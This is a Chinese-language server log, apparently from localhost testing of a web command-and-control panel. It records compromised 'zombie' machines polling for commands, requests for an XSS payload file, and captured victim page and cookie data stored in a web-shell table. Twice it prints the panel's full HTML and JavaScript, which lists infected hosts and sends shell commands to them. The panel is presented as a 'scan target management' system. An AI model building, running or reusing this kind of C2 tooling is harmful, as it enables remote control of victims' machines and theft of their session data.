2025-06-24 23:40:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:40:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:40:20] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:41:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:41:20 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:41:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:41:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:41:20] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:42:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:42:20 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:42:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:42:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:42:20] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:43:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:43:20 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:43:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:43:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:43:20] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:44:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:44:20 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:44:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:44:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:44:20] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:45:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:45:20 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:45:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:45:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:45:20] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:46:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:46:20 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:46:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:46:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:46:20] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:46:59 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-24 23:46:59 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-24 23:46:59 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0086s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> 127.0.0.1</p>\n            <p><strong>目標配置:</strong> {&#34;where&#34;:&#34;http://127.0.0.1:8000/&#34;,&#34;target_ip&#34;:&#34;127.0.0.1&#34;,&#34;cookie&#34;:&#34;&#34;,&#34;user_agent&#34;:&#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36&#34;,&#34;time_stamp&#34;:&#34;2025-06-24T15:37:45.696Z&#34;}</p>\n            <p><strong>建立時間:</strong> 2025-06-24 23:37:45.700292</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-24 23:46:59 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:46:59] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-24 23:46:59 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:46:59] "[36mGET /static/css/control_message.css HTTP/1.1[0m" 304 -
2025-06-24 23:46:59 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:46:59] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 23:47:00 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:47:00 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:47:00 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:47:00 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:47:00] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:47:00 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:47:00 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:47:00 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:47:00 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:47:00] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:47:01 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:47:01 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:47:01 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:47:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:47:01] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:47:02 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 xss_payload()
2025-06-24 23:47:02 | INFO     | control_route.py:125 | xss_payload() | 用戶請求XSS載荷文件
2025-06-24 23:47:02 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] xss_payload 執行完畢 (耗時: 0.0003s) -> 回傳: <Response 2102 bytes [200 OK]>
2025-06-24 23:47:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:47:02] "GET /api/control/xss_payload HTTP/1.1" 200 -
2025-06-24 23:47:02 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-24 23:47:02 | INFO     | control_route.py:18 | add_message() | 用戶請求添加消息 (POST)
2025-06-24 23:47:02 | ERROR    | control_route.py:58 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command) VALUES (?, ?, ?, ?, ?)]
[parameters: ('127.0.0.1', '{"where":"http://127.0.0.1:8000/","target_ip":"127.0.0.1","cookie":"","user_agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36","time_stamp":"2025-06-24T15:47:02.548Z"}', None, '2025-06-24 23:47:02.552632', None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-24 23:47:02 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0022s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-24 23:47:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:47:02] "[32mPOST /api/control/add_message HTTP/1.1[0m" 302 -
2025-06-24 23:47:03 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:47:03 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:47:03 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:47:03 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:47:03] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:47:04 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:47:04 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:47:04 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:47:04 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:47:04] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:47:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:47:05 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:47:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:47:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:47:05] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:47:06 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:47:06 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:47:06 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:47:06 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:47:06] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:47:07 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:47:07 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:47:07 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:47:07 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:47:07] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:47:08 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:47:08 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:47:08 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:47:08 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:47:08] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:47:09 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:47:09 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:47:09 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:47:09 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:47:09] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:47:10 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:47:10 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:47:10 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:47:10 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:47:10] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:47:11 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:47:11 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:47:11 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:47:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:47:11] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:47:12 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:47:12 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:47:12 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:47:12 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:47:12] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:47:13 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:47:13 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:47:13 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:47:13 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:47:13] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:47:13 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 xss_payload()
2025-06-24 23:47:13 | INFO     | control_route.py:125 | xss_payload() | 用戶請求XSS載荷文件
2025-06-24 23:47:13 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] xss_payload 執行完畢 (耗時: 0.0004s) -> 回傳: <Response 2102 bytes [200 OK]>
2025-06-24 23:47:13 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:47:13] "GET /api/control/xss_payload HTTP/1.1" 200 -
2025-06-24 23:47:13 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-24 23:47:13 | INFO     | control_route.py:18 | add_message() | 用戶請求添加消息 (POST)
2025-06-24 23:47:13 | ERROR    | control_route.py:58 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command) VALUES (?, ?, ?, ?, ?)]
[parameters: ('127.0.0.1', '{"where":"http://127.0.0.1:8000/","target_ip":"127.0.0.1","cookie":"","user_agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36","time_stamp":"2025-06-24T15:47:13.976Z"}', None, '2025-06-24 23:47:13.980377', None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-24 23:47:13 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0016s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-24 23:47:13 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:47:13] "[32mPOST /api/control/add_message HTTP/1.1[0m" 302 -
2025-06-24 23:47:14 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:47:14 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:47:14 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:47:14 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:47:14] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:47:15 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:47:15 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:47:15 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:47:15 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:47:15] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:47:17 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:47:17 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:47:17 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:47:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:47:17] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:47:18 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:47:18 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:47:18 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:47:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:47:18] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:47:18 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-24 23:47:18 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-24 23:47:18 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0008s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    